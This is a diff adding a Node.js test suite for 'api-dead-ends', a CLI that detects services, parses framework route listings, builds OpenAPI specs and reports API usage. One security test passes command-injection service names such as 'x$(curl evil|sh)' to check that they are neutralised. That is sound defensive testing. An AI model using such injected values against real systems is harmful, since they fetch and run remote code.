@@ -1,0 +1,180 @@
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { spawnSync, spawn } from 'node:child_process';
+import { readFileSync, existsSync, writeFileSync } from 'node:fs';
+import { join } from 'node:path';
+import { makeRepo, ES_GATEWAY } from './fixtures/make-repo.mjs';
+import { detectProject } from '../src/setup/detect.mjs';
+import { parseRoutes, toOpenApiPath, routesToOpenApi } from '../src/routes.mjs';
+import { loadSpec, matchOp } from '../src/spec.mjs';
+
+const BIN = new URL('../bin/api-dead-ends.mjs', import.meta.url).pathname;
+const run = (cwd, args, input) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: 'utf8', input });
+
+test('detect: polyglot repo → one service per manifest, frameworks, specs, observability', async () => {
+  const d = await detectProject(makeRepo());
+  const by = Object.fromEntries(d.services.map((s) => [s.name, s]));
+  assert.deepEqual(Object.keys(by).sort(), ['accounts', 'catalog', 'gateway', 'orders', 'payments', 'shop-web']);
+  assert.deepEqual([by.gateway.language, by.gateway.frameworks], ['node', ['express']]);
+  assert.deepEqual([by.orders.language, by.orders.frameworks], ['go', ['gin']]);
+  assert.deepEqual([by.payments.language, by.payments.frameworks], ['java', ['spring']]);
+  assert.deepEqual(by.catalog.frameworks, ['fastapi']);
+  assert.deepEqual(by.accounts.frameworks, ['rails']);
+  assert.deepEqual(by['shop-web'].frameworks, ['next']);
+  assert.deepEqual(by.gateway.specs, ['services/gateway/openapi.json']);
+  assert.ok(d.observability.includes('elasticsearch'));
+  assert.ok(by.payments.observability.includes('prometheus'));
+  assert.ok(by.gateway.loggers.includes('pino-http'));
+});
+
+test('routes: rails, gin, flask, spring, laravel, express-list-endpoints, django, plain', () => {
+  assert.equal(toOpenApiPath('/users/:id(.:format)'), '/users/{id}');
+  assert.equal(toOpenApiPath('/u/<int:pk>/'), '/u/{pk}');
+  assert.equal(toOpenApiPath('users/{id?}'), '/users/{id}');
+  assert.equal(toOpenApiPath('/files/*rest'), '/files/{rest}');
+  const rails = parseRoutes('  user GET    /users/:id(.:format)   users#show\n       PATCH  /users/:id(.:format)   users#update\nPrefix Verb URI Pattern');
+  assert.deepEqual(rails.map((r) => `${r.method} ${r.path}`), ['GET /users/{id}', 'PATCH /users/{id}']);
+  const gin = parseRoutes('[GIN-debug] GET    /ping   --> main.main.func1 (3 handlers)');
+  assert.deepEqual(gin[0], { method: 'GET', path: '/ping' });
+  const flask = parseRoutes("<Rule '/items/<int:id>' (GET, HEAD, OPTIONS) -> item>\nitem_save  POST, PUT  /items/<int:id>");
+  assert.deepEqual(flask.map((r) => `${r.method} ${r.path}`), ['GET /items/{id}', 'POST /items/{id}', 'PUT /items/{id}']);
+  const spring = parseRoutes(JSON.stringify({ contexts: { app: { mappings: { dispatcherServlets: { d: [{ predicate: '{GET [/pay/{id}], produces [application/json]}' }, { predicate: '{ [/error]}' }] } } } } }));
+  assert.deepEqual(spring.map((r) => `${r.method} ${r.path}`), ['GET /pay/{id}', 'ANY /error']);
+  const laravel = parseRoutes(JSON.stringify([{ method: 'GET|HEAD', uri: 'api/users/{user}' }]));
+  assert.deepEqual(laravel, [{ method: 'GET', path: '/api/users/{user}' }]);
+  const ele = parseRoutes(JSON.stringify([{ path: '/a/:id', methods: ['GET', 'POST'] }]));
+  assert.equal(ele.length, 2);
+  const django = parseRoutes('/admin/\tdjango.contrib.admin\tadmin:index\n/api/users/<int:pk>/\tapi.views.User\tuser');
+  assert.deepEqual(django.map((r) => `${r.method} ${r.path}`), ['ANY /admin', 'ANY /api/users/{pk}']);
+});
+
+test('spec: ANY routes match every method, explicit method wins', () => {
+  const s = loadSpec(routesToOpenApi([{ method: 'ANY', path: '/x/{id}' }, { method: 'GET', path: '/x/{id}' }]));
+  assert.equal(matchOp(s.ops, 'DELETE', '/x/5').method, 'ANY');
+  assert.equal(matchOp(s.ops, 'GET', '/x/5').method, 'GET');
+});
+
+test('init --yes --json --dry-run: plan for every service, nothing written', () => {
+  const dir = makeRepo();
+  const r = run(dir, ['init', '--yes', '--json', '--dry-run', '--source', 'elasticsearch']);
+  assert.equal(r.status, 0, r.stderr);
+  const plan = JSON.parse(r.stdout);
+  assert.equal(plan.config.source.type, 'elasticsearch');
+  assert.equal(plan.config.services.length, 6);
+  const gw = plan.steps.find((s) => s.service === 'gateway');
+  assert.match(gw.steps.at(-1).cmd, /report --usage .*--spec services\/gateway\/openapi.json/);
+  const orders = plan.steps.find((s) => s.service === 'orders');
+  assert.match(orders.steps[0].cmd, /spec from-routes services\/orders\/routes.txt --title orders/); // routes.txt found by the scan
+  const payments = plan.steps.find((s) => s.service === 'payments');
+  assert.match(payments.steps[0].note, /v3\/api-docs/); // no spec, no route file → how to get one from Spring
+  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
+});
+
+test('init interactive via pipe: answers by line, Enter = default; refuses to overwrite', () => {
+  const dir = makeRepo();
+  // source 1 (ES) · access 1 · index · services 3,4 (gateway, orders: alphabetical scan) · per service: log name, spec, (routes) · days · AI 2 · confirm
+  const answers = ['1', '1', 'logs-shop-*', '3,4', 'gateway-svc', '', 'orders-svc', '', 'services/orders/routes.txt', '30', '2', 'y'].join('\n') + '\n';
+  const r = run(dir, ['init'], answers);
+  assert.equal(r.status, 0, r.stderr + r.stdout);
+  const cfg = JSON.parse(readFileSync(join(dir, 'api-dead-ends.config.json'), 'utf8'));
+  assert.equal(cfg.source.index, 'logs-shop-*');
+  assert.deepEqual(cfg.services.map((s) => [s.name, s.logName]), [['gateway', 'gateway-svc'], ['orders', 'orders-svc']]);
+  assert.equal(cfg.services[1].routes, 'services/orders/routes.txt');
+  assert.equal(cfg.days, 30);
+  const next = readFileSync(join(dir, '.api-dead-ends/NEXT-STEPS.md'), 'utf8');
+  assert.match(next, /spec from-routes services\/orders\/routes.txt/);
+  assert.match(readFileSync(join(dir, '.api-dead-ends/AGENT.md'), 'utf8'), /Never delete/);
+  const again = run(dir, ['init', '--yes']);
+  assert.equal(again.status, 2);
+  assert.match(again.stderr, /already exists/);
+});
+
+test('cli: help exits 0, init --help prints help and writes nothing, unknown flag is a clean error', () => {
+  const dir = makeRepo();
+  assert.equal(run(dir, ['--help']).status, 0);
+  const h = run(dir, ['init', '--help']);
+  assert.equal(h.status, 0);
+  assert.match(h.stdout, /--yes/);
+  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
+  const u = run(dir, ['init', '--recorder']);
+  assert.equal(u.status, 2);
+  assert.doesNotMatch(u.stderr, /at .*node:internal/);
+  const empty = run(dir, ['init'], '');
+  assert.equal(empty.status, 2, 'no TTY, no answers, no --yes → refuse');
+  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
+});
+
+test('report: literal on a parameter is flagged; 5xx below threshold listed; zero traffic refused', () => {
+  const dir = makeRepo();
+  writeFileSync(join(dir, 'u.csv'), 'method,path,calls,status\nGET,/orders/{id},1000,200:990|500:10\nGET,/orders/export,50,200:50\nGET,/orders,100,200:95|500:5\n');
+  run(dir, ['spec', 'from-routes', 'services/orders/routes.txt', '-o', 'o.json']);
+  const r = run(dir, ['report', '--usage', 'u.csv', '--spec', 'o.json', '--json']);
+  const j = JSON.parse(r.stdout);
+  assert.deepEqual(j.ambiguous.map((a) => a.path), ['/orders/export']);
+  assert.deepEqual(j.errorsBelow.map((e) => e.path), ['/orders']);
+  assert.equal(j.endpoints.find((e) => e.method === 'GET' && e.path === '/orders/{id}').calls, 1000, 'separate-route traffic is not added to {id}');
+  assert.equal(j.totals.shadow, 1, 'and it counts as undocumented');
+  writeFileSync(join(dir, 'z.csv'), 'method,path,calls\n');
+  const z = run(dir, ['report', '--usage', 'z.csv', '--spec', 'o.json']);
+  assert.equal(z.status, 2);
+  assert.match(z.stderr, /No traffic/);
+});
+
+test('templating: token-like segments are folded, ordinary words stay', async () => {
+  const { templatePath } = await import('../src/template.mjs');
+  assert.equal(templatePath('/share/AbCdEfGhIjKl'), '/share/{id}');
+  assert.equal(templatePath('/share/sk_live_abcdefgh'), '/share/{id}');
+  assert.equal(templatePath('/api/getUserById'), '/api/getUserById');
+  assert.equal(templatePath('/api/orders/export'), '/api/orders/export');
+});
+
+test('security: hostile service names never reach generated shell commands', async () => {
+  const { buildSteps } = await import('../src/setup/plan.mjs');
+  const steps = buildSteps({ version: 1, source: { type: 'datadog-apm' }, days: 30, ai: { mode: 'off' }, out: '.api-dead-ends',
+    services: [{ name: 'x$(curl evil|sh)', dir: '.', language: 'node', frameworks: [], logName: 'x$(id)', spec: 'a b.json', routes: null }] });
+  for (const st of steps[0].steps) if (st.cmd) {
+    assert.doesNotMatch(st.cmd.replace(/'[^']*'/g, "''"), /\$\(|`|\|sh/, st.cmd);
+  }
+});
+
+test('end to end on the synthetic repo: init plan → convert → spec from-routes → report', () => {
+  const dir = makeRepo();
+  writeFileSync(join(dir, 'es.json'), JSON.stringify(ES_GATEWAY));
+  assert.equal(run(dir, ['convert', 'elasticsearch', 'es.json', '--spec', 'services/gateway/openapi.json', '-o', 'usage.csv']).status, 0);
+  const rep = run(dir, ['report', '--usage', 'usage.csv', '--spec', 'services/gateway/openapi.json', '--out', 'rep']);
+  assert.equal(rep.status, 0, rep.stderr);
+  const j = JSON.parse(readFileSync(join(dir, 'rep/report.json'), 'utf8'));
+  assert.equal(j.totals.shadow, 1);
+  assert.equal(j.serverErrors[0].path, '/api/products/{id}');
+  const sp = run(dir, ['spec', 'from-routes', 'services/accounts/routes.txt', '-o', 'out/accounts.json']);
+  assert.equal(sp.status, 0, sp.stderr);
+  assert.ok(JSON.parse(readFileSync(join(dir, 'out/accounts.json'), 'utf8')).paths['/users/{id}'].patch);
+});
+
+test('mcp: legacy initialize, modern discover, tools/list, tools/call, version error', async () => {
+  const dir = makeRepo();
+  const p = spawn(process.execPath, [BIN, 'mcp'], { cwd: dir });
+  const lines = [];
+  let buf = '';
+  p.stdout.on('data', (d) => { buf += d; let i; while ((i = buf.indexOf('\n')) >= 0) { lines.push(JSON.parse(buf.slice(0, i))); buf = buf.slice(i + 1); } });
+  const msgs = [
+    { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
+    { jsonrpc: '2.0', method: 'notifications/initialized' },
+    { jsonrpc: '2.0', id: 2, method: 'tools/list' },
+    { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'detect_project', arguments: {} } },
+    { jsonrpc: '2.0', id: 4, method: 'server/discover', params: { _meta: { 'io.modelcontextprotocol/protocolVersion': '2026-07-28' } } },
+    { jsonrpc: '2.0', id: 5, method: 'tools/list', params: { _meta: { 'io.modelcontextprotocol/protocolVersion': '1900-01-01' } } },
+    { jsonrpc: '2.0', id: 6, method: 'tools/call', params: { name: 'nope' } },
+  ];
+  p.stdin.end(msgs.map((m) => JSON.stringify(m)).join('\n') + '\n');
+  await new Promise((r) => p.on('close', r));
+  const by = Object.fromEntries(lines.map((l) => [l.id, l]));
+  assert.equal(by[1].result.protocolVersion, '2025-06-18');
+  assert.ok(by[2].result.tools.every((t) => /^[a-z_]+$/.test(t.name)));
+  assert.equal(by[3].result.isError, false);
+  assert.equal(by[3].result.structuredContent.services.length, 6);
+  assert.deepEqual(by[4].result.supportedVersions, ['2026-07-28']);
+  assert.equal(by[5].error.code, -32022);
+  assert.equal(by[6].error.code, -32602);
+  assert.equal(lines.length, 6, 'notifications get no reply');
+});
